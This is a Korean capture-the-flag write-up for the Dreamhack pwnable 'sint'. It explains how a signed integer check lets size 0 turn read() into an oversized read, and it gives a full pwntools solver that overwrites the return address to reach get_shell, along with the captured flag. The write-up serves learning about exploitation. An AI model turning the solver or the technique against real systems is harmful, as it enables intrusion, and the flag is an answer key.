# Dreamhack: sint Write-up

## 1. Problem Overview
- **Category:** Pwnable  
- **Difficulty:** Level 1  
- **Tool:** IDA Free, VS Code (Python), Pwndbg  
- **Description:** signed integer 취약점을 이용해 oversized `read()`를 발생시키고 셸을 획득하는 문제

---

## 2. Static Analysis (정적 분석)

먼저 제공된 바이너리를 IDA로 분석하였다.

프로그램의 핵심 코드는 다음과 같다.

```c
char buf[256];
int size;

printf("Size: ");
scanf("%d", &size);

if (size > 256 || size < 0)
{
    printf("Buffer Overflow!\n");
    exit(0);
}

printf("Data: ");
read(0, buf, size - 1);
```

버퍼는 다음과 같이 선언되어 있다.

```c
char buf[256];
```

즉 정상적인 경우라면 최대 256바이트까지만 입력을 받아야 한다.

### Size 검사

입력된 `size` 값은 아래 조건문을 통해 검사된다.

```c
if (size > 256 || size < 0)
```

따라서 정상적으로는 `0 ~ 256` 범위의 값만 허용된다.

하지만 실제로 `read()`에 전달되는 값은 다음과 같다.

```c
read(0, buf, size - 1);
```

즉 검사한 값은 `size`이지만 실제 사용되는 값은 `size - 1`이다.

### Integer Issue

만약 `size = 0`을 입력하면 다음과 같은 계산이 이루어진다.

```
size - 1 = -1
```

하지만 `read()`의 세 번째 인자는 내부적으로 `size_t` (unsigned) 타입으로 처리된다.

따라서 `-1`은 다음과 같이 변환된다.

```
-1 → 0xffffffff
```

즉 프로그램은 매우 큰 크기의 입력을 허용하게 된다.

이로 인해 작은 스택 버퍼에 과도한 데이터가 들어갈 수 있다.

### get_shell 함수

바이너리에는 다음과 같은 함수가 존재한다.

```c
void get_shell()
{
    system("/bin/sh");
}
```

그리고 프로그램 초기화 과정에서 다음 코드가 실행된다.

```c
signal(SIGSEGV, get_shell);
```

즉 Segmentation Fault가 발생하면 `get_shell()`이 호출된다.

---

## 3. Solution & Dynamic Analysis (동적 분석)

### Exploit Strategy

전체 공격 흐름은 다음과 같다.

1. `Size` 입력에 **0**을 넣는다.
2. 조건문을 통과한다.
3. `read(0, buf, size-1)` → `read(..., -1)` 이 된다.
4. `-1`이 unsigned로 변환되면서 매우 큰 크기의 read가 발생한다.
5. buf를 초과하는 입력이 가능해진다.
6. return address를 overwrite 한다.
7. `get_shell()`로 제어 흐름을 변경한다.

---

### RET Overwrite

스택 구조는 다음과 같다.

``` assembly
[ buf (256 bytes) ]
[ saved EBP (4 bytes) ]
[ RET ]
```

따라서 return address까지의 offset은 다음과 같다.

``` text
256 + 4 = 260 bytes
```

payload 구조는 다음과 같다.

``` text
'A' * 260 + get_shell 주소
```

---

### Dynamic Analysis

GDB(pwndbg)를 이용해 스택 상태를 확인하였다.

버퍼에 입력 데이터가 저장되는 것을 확인할 수 있다.

``` assembly
pwndbg> x/300bx 0xffffcb68
0xffffcb68:     0x31    0x32    0x33    0x34    0x31    0x32    0x33    0x34
---------------------------------------------------------------------------- : 12341234가 32번 반복
0xffffcc68:     0x00    0x00    0x00    0x00    0x75    0x7c    0xda    0xf7 : ret addr가 little endian으로 저장되어있다.
```

이는 ASCII 기준

``` text
1234
```

가 반복되어 저장된 것이다.

이로부터 입력 데이터가 buf 영역에 저장되는 것을 확인할 수 있다.

또한 더 긴 입력을 넣었을 때 return address가 overwrite 되는 것을 확인할 수 있다.

---

### Full Solver Code

```python
from pwn import *

# 바이너리 아키텍처 설정 (32bit)
context.arch = 'i386'

# 드림핵 원격 서버 연결
p = remote('host3.dreamhack.games', 9075)

# Size 입력 단계
# size = 0 을 넣어 조건문을 우회하고
# read(0, buf, size-1) -> read(..., -1) 이 되도록 유도
p.sendlineafter(b"Size: ", b"0")

# buf[256] 이후 saved frame pointer 크기
sfp_size = 4

# buf 시작부터 saved frame pointer까지 거리
buf_to_sfp = 0x100

# 호출할 함수 주소 (get_shell)
target_addr = 0x8048659

# payload 구성
# buf(256) + saved ebp(4) 를 채운 뒤
# return address를 get_shell 주소로 overwrite
payload = b'A' * (sfp_size + buf_to_sfp)
payload += p32(target_addr)

# Data 입력 단계에서 payload 전송
p.sendlineafter(b"Data: ", payload)

# 쉘 획득 후 interactive 모드로 전환
p.interactive()
```

---

## 4. Results

```bash
dreamhack@dongyeon:/mnt/f/dream$ python3 p.py
[+] Opening connection to host3.dreamhack.games on port 9075: Done
[*] Switching to interactive mode
$ ls
flag
sint
$ cat flag
DH{d66e84c453b960cfe37780e8ed9d70ab}
```

---

## 5. Thoughts

이 문제는 단순한 버퍼 오버플로우 문제처럼 보이지만 실제 핵심은 **signed integer issue**이다.

코드를 처음 보면 다음 조건문 때문에 안전해 보인다.

```
if (size > 256 || size < 0)
```

하지만 실제로 사용되는 값이 `size - 1`이기 때문에 `size = 0` 입력 시 `read()`에 `-1`이 전달된다.

이 값이 unsigned로 변환되면서 oversized read가 발생하고 버퍼를 초과하는 입력이 가능해진다.

또한 `SIGSEGV` 핸들러가 `get_shell`로 등록되어 있어 프로그램 크래시만 발생시켜도 셸을 획득할 수 있도록 설계되어 있다.

이 문제를 통해 다음과 같은 점을 확인할 수 있었다.

- 검증한 값과 실제 사용되는 값이 다르면 취약점이 발생할 수 있다.
- signed → unsigned 변환은 보안적으로 매우 위험하다.
- 단순한 산술 연산(`size - 1`)도 취약점으로 이어질 수 있다.
